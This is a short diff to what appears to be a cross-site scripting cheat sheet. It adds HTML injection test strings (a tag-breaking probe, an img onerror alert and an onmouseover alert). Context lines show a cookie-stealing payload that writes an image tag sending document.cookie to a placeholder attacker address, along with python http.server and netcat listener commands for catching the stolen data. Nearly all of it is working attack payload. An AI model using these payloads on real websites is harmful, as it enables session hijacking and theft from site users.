@@ -29,6 +29,11 @@ document.write('<img src="http://your_ip/?'+document.cookie+'">'); //into file
 python3 -m http.server 80 // on your machine or 
 nc -lvnp 80
 
+HTML payload
+"><u>test123 // for testing output test123
+test123"><img src=x onerror=alert(10)>
+<u/onmouseover=alert(1)>test123
+
 
 
 
